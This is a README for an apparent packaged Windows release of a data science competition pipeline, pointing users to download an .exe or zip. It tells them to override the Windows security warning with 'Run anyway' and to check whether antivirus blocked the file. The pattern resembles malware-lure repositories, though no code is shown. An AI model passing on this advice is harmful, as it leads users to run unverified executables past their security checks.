# 🧩 Data-Fusion-public-solution- - Run the full data pipeline

[![Download](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)

## 📌 What this app does

This project runs a public solution for the **Data Fusion Contest 2026 / CyberShelf**.

It gives you a ready-made pipeline that can:

- build a compact working dataset from raw data
- train models for each target
- create charts and analysis files
- show results in a web app
- export tables for review

If you want to use the project on Windows, the release page is the place to visit to download the app and run it on your computer.

## 🖥️ What you need

Before you start, make sure your PC has:

- **Windows 10 or Windows 11**
- at least **8 GB RAM**
- enough free disk space for the data files
- an internet connection for the first download
- permission to run downloaded files

For better performance, **16 GB RAM** works well when you process larger files.

## 🚀 Download and install

1. Open the release page:  
   [Visit the download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)

2. Find the latest release at the top of the page.

3. Download the file for Windows. It may be an `.exe`, `.zip`, or similar package.

4. If the file is a `.zip` archive:
   - right-click the file
   - choose **Extract All**
   - select a folder such as `Downloads\Data-Fusion`

5. If the file is an `.exe`:
   - double-click it
   - follow the setup steps on screen

6. If Windows shows a security prompt:
   - choose **More info**
   - then choose **Run anyway** if you trust the source

7. Keep the files in a simple folder path, such as:
   - `C:\Data-Fusion`
   - `C:\Users\YourName\Downloads\Data-Fusion`

## ⚙️ First run

After the app is installed or extracted:

1. Open the folder where you placed the files.

2. Look for the main app file, installer, or launch script.

3. Double-click the file to start it.

4. Wait while the program loads the dataset and prepares the workspace.

5. If the app asks for a data folder, choose the folder that contains your input files.

6. If the app opens a browser page, keep that window open while the process runs.

The first run can take a few minutes because the app prepares data and builds models.

## 📂 Input files

The app works with raw parquet data used in the CyberShelf data fusion task.

Place your files in the input folder if the release package includes one. Use a clean folder structure like this:

- `input`
- `output`
- `logs`

If the app includes sample files, you can test with those first before using your own data.

## 🔍 What happens inside

The pipeline follows these main steps:

- reads the raw parquet data
- builds a smaller working dataset
- checks extra features
- trains one pipeline for each of the 41 targets
- combines model results with blending
- creates analysis files and plots
- saves outputs for review

It uses several model types and combines them to get stable results. The app also creates analysis views that help you inspect the data.

## 📊 What you can see

After the run, you may get files and views such as:

- target predictions
- feature importance tables
- PCA plots
- cluster views
- target profiles
- missing value reports
- drift checks
- exported charts
- web dashboard output

If the web app is included in the release, open it in your browser to view the results in a clear layout.

## 🌐 Web app

The project also includes a site for visual review.

Open the web app here:

[CyberShelf Analytics Site](https://data-fusion-web-app.vercel.app/)

Use it to inspect the output, view charts, and review the analysis layer from the pipeline.

## 🧪 Kaggle notebook

You can also review the notebook version of the solution here:

[Public Solution Data Fusion](https://www.kaggle.com/code/dambek/public-solution-data-fusion)

This is useful if you want to compare the notebook flow with the packaged app.

## 🛠️ Common Windows issues

If the app does not start, check these points:

- make sure the file finished downloading
- extract the archive before running files inside it
- avoid folder names with special characters
- run the app from a local drive, not a network folder
- close other heavy apps if the system feels slow
- check that your antivirus did not block the file

If the app closes right away, try launching it again from the main folder.

## 📁 Suggested folder layout

Use this layout if you want to keep things simple:

- `C:\Data-Fusion\app`
- `C:\Data-Fusion\input`
- `C:\Data-Fusion\output`
- `C:\Data-Fusion\logs`

This makes it easier to find files after the run.

## 🧭 How to use the results

When the process ends, open the output folder and review:

- the prediction files
- the charts
- the tables
- the logs

If the project includes a local HTML report, double-click it to open it in your browser.

## 📦 Release page

To download the Windows package, go here:

[https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)

Open the latest release, download the file that matches Windows, then run it or extract it before launch

## 📝 Project files

The repository also includes:

- `solution.md`
- notebook reference
- web app link
- analysis assets for the public solution

## 🔗 Quick links

- [Download page](https://github.com/Mohamedch1793/Data-Fusion-public-solution-/releases)
- [Web app](https://data-fusion-web-app.vercel.app/)
- [Kaggle notebook](https://www.kaggle.com/code/dambek/public-solution-data-fusion)
- [Solution.md](./solution.md)

## 🧷 File names you may see

The release package may include files such as:

- `Data-Fusion-public-solution-.exe`
- `setup.exe`
- `app.zip`
- `run.bat`
- `README.html`

Use the main file in the package and follow the on-screen steps

## 🖱️ Simple start flow

1. Visit the release page
2. Download the Windows package
3. Extract it if needed
4. Open the main app file
5. Choose the data folder if asked
6. Wait for the pipeline to finish
7. Open the output files or web dashboard